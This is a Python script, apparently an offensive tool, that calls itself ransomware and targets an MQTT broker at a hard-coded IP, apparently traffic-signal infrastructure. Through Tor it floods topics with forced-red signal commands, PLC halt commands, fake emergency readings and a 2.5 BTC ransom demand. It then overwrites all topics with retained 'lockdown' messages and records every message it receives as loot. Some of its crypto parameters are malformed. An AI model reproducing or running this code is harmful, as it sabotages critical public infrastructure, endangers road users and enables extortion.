#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.2 - TRUSTEDF57 | POST-CHAOS AES LOCKDOWN
# FASE 1: Caos visibile → FASE 2: AES cifratura totale retained

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        self.ransom = "2.5 BTC"
        
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        # TOR
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.mqtt_client = mqtt.Client("TRUSTEDF57_LOCKDOWN", clean_session=False)
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        
        self.chaos_active = True      # FASE 1
        self.aes_lockdown = False    # FASE 2
        self.lockdown_time = 120     # 2min caos → lockdown
        
    def aes_encrypt_all(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
    
    def lockdown_payload(self):
        """TUTTO CIFRATO - non leggibile da PLC/SCADA"""
        config_enc = self.aes_encrypt_all(json.dumps({
            "STATUS": "AES_LOCKDOWN_ACTIVE",
            "OP": self.op_name,
            "BTC": self.btc_addr,
            "DECRYPT_KEY_REQUIRED": self.aes_key.hex()
        }))
        
        return json.dumps({
            "LOCKDOWN": True,
            "AES_CONFIG": config_enc,
            "VERBOSE": "TRUSTEDF57_*AES_BLOCKED*",
            "WILDCARD": "#",
            "PLC_HALT": True
        })
    
    def fase1_chaos(self):
        """FASE 1: Caos visibile SEMAFORI/DISPLAY"""
        chaos = [
            {"topic": "traffic-triggers-output", "payload": json.dumps({
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
                "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True}], "trigger_output": 31+i} for i in range(1,15)]
            })},
            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"MESSAGE": "🚨 TRUSTEDF57 GOVERNA 🚨", "BTC": self.btc_addr})},
            {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"CONTATORI": "BLOCCATI", "PAGA": "2.5 BTC"})},
            {"topic": "comhub-diagnostics", "payload": json.dumps({"com_hub_cpu_temperature": 999, "STATUS": "MIL_LOCKOUT"})},
            {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": "TRUSTEDF57"})}
        ]
        
        for p in chaos:
            self.mqtt_client.publish(p["topic"], p["payload"], qos=2, retain=True)
    
    def fase2_lockdown(self):
        """FASE 2: AES cifratura TOTALE - tutto retained bloccato"""
        aes_payload = self.lockdown_payload()
        
        # CIFRA TUTTI I TOPICS CRITICI
        critical_topics = [
            "traffic-triggers-output", "traffic-statistic-output/#", 
            "comhub-diagnostics", "plc-diagnostics", "sdlc-diagnostics",
            "sensor-traffic-objects/#", "#", "traffic-triggers-output/+"
        ]
        
        for topic in critical_topics:
            self.mqtt_client.publish(topic, aes_payload, qos=2, retain=True)
            print(f"🔒 AES_LOCKDOWN -> {topic}")
    
    def fake_emergency(self):
        for sensor in ["sensor1","sensor2","sensor3"]:
            self.mqtt_client.publish(f"sensor-traffic-objects/{sensor}", 
                json.dumps({"EMERGENCY": "TRUSTEDF57", "speed": 999}), qos=2)
    
    def on_connect(self, client, userdata, flags, rc):
        print("✅ FASE1 CHAOS → FASE2 AES_LOCKDOWN")
        client.subscribe("#", qos=2)
        
        # Thread caos + lockdown timer
        threading.Thread(target=self.chaos_loop, daemon=True).start()
        threading.Thread(target=self.lockdown_timer, daemon=True).start()
        threading.Thread(target=self.emergency_loop, daemon=True).start()
    
    def chaos_loop(self):
        while self.chaos_active:
            self.fase1_chaos()
            time.sleep(0.8)  # Spam aggressivo
    
    def lockdown_timer(self):
        time.sleep(self.lockdown_time)
        self.chaos_active = False
        self.aes_lockdown = True
        print("🔄 → FASE 2: AES TOTAL LOCKDOWN")
        self.fase2_lockdown()
    
    def emergency_loop(self):
        while True:
            self.fake_emergency()
            time.sleep(3)
    
    def on_message(self, client, userdata, msg):
        data = msg.payload.decode(errors='ignore')
        print(f"[LOOT] {msg.topic}: {data[:80]}...")
        
        # Sempre exfil cifrato
        enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
        with open("swarco_total.aes", "ab") as f:
            f.write(f"{enc_loot}\n".encode())
    
    def aes_encrypt_all(self, data):  # Overload per loot
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
    
    def run(self):
        while True:
            try:
                self.mqtt_client.connect(self.target_ip, self.port, 60)
                self.mqtt_client.loop_forever()
            except Exception as e:
                print(f"🔄 Reconnect: {e}")
                time.sleep(3)

if __name__ == "__main__":
    print("🚀 TRUSTEDF57 | FASE1→FASE2 AES_LOCKDOWN")
    rw = SWARCORansomware()
    rw.run()
